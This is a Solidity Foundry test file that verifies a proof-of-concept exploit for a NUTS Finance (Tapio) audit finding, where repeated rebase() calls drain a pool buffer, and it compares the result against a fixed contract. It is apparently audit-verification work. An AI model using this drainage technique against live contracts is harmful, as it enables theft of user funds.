// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    SelfPeggingAsset,
    SelfPeggingAssetFixed,
    LPTokenDouble,
    MiniToken,
    ConstantExchangeRateProvider
} from "./62662-buffer-drainage-through-repeated-rebase-calls-due-to-stale-s.sol";

// NUTS Finance (Tapio) finding 62662 — buffer drainage via repeated rebase().
//
// Vulnerable source: SelfPeggingAsset.rebase()@46eb22ba~1 (audited/pre-fix). The
// `oldD > newD` branch calls poolToken.removeTotalSupply(oldD - newD, true, true)
// WITHOUT updating `balances`/`totalSupply`, so the same gap re-triggers on every
// permissionless call and the buffer is drained repeatedly.
contract BufferDrainageRepeatedRebaseTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_repeatedRebaseDrainsBufferPerCall() public {
        Exploit e = new Exploit();
        e.run();

        // Each rebase drains the SAME oldD-newD gap = 100 buffer-units.
        assertEq(e.gapPerCall(), 100, "per-call loss gap");

        // BUGGY: 3 permissionless calls drain 3 x 100 = 300; buffer 1000 -> 700.
        assertEq(e.buggyBufferDrained(), 300, "buggy drains per-call (3x)");
        assertEq(e.buggyBufferRemaining(), 700, "buggy buffer remaining after 3 calls");

        // Harm marker: 300 DESTROYED buffer-units recorded at the SINK.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), 300, "marker records destroyed buffer at SINK");
        assertEq(e.sinkMarkerBalance(), 300, "sink marker balance");

        // Real buffer truly destroyed on the poolToken: 300 gone from bufferAmount.
        LPTokenDouble pool = LPTokenDouble(e.poolTokenAddr());
        assertEq(pool.bufferAmount(), 700, "poolToken buffer really drained by 300");
    }

    function test_control_fixedRebaseDrainsBufferOnce() public {
        // Negative control: the HEAD fix syncs state, so only ONE drain occurs
        // even across 3 calls (subsequent calls see oldD == newD -> return 0).
        Exploit e = new Exploit();
        e.run();

        assertEq(e.fixedBufferDrained(), 100, "fixed drains exactly once");
        assertEq(e.fixedBufferRemaining(), 900, "fixed buffer remaining after 3 calls");

        LPTokenDouble fixedPool = LPTokenDouble(e.fixedPoolTokenAddr());
        assertEq(fixedPool.bufferAmount(), 900, "fixed poolToken loses only one gap");

        // The bug strictly amplifies buffer destruction vs the fixed contract.
        assertGt(e.buggyBufferDrained(), e.fixedBufferDrained(), "bug amplifies destruction");
        assertEq(
            e.buggyBufferDrained(),
            3 * e.fixedBufferDrained(),
            "3 illegitimate drains vs 1 legitimate drain"
        );
    }
}
